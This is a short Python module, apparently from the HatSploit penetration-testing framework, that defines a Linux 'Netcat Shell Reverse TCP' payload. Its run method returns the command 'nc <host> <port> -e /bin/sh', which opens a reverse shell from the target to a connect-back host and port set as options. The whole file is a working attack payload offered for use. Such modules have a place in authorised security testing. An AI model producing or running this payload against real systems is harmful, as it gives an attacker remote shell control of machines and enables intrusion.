#!/usr/bin/env python3

#
# This payload requires HatSploit: https://hatsploit.netlify.app
# Current source: https://github.com/EntySec/HatSploit
#

from hatsploit.lib.payload import Payload
from hatsploit.utils.tcp import TCPClient


class HatSploitPayload(Payload):
    details = {
        'Category': "single",
        'Name': "Netcat Shell Reverse TCP",
        'Payload': "linux/generic/netcat_reverse_tcp",
        'Authors': [
            'Ivan Nikolsky (enty8080) - payload developer'
        ],
        'Description': "Netcat shell reverse TCP payload.",
        'Comments': [
            ''
        ],
        'Architecture': "generic",
        'Platform': "linux",
        'Risk': "high",
        'Type': "reverse_tcp"
    }

    options = {
        'CBHOST': {
            'Description': "Connect-back host.",
            'Value': TCPClient.get_local_host(),
            'Type': "ip",
            'Required': True
        },
        'CBPORT': {
            'Description': "Connect-back port.",
            'Value': 8888,
            'Type': "port",
            'Required': True
        }
    }

    def run(self):
        connback_host, connback_port = self.parse_options(self.options)

        payload = f"nc {connback_host} {connback_port} -e /bin/sh"
        return payload
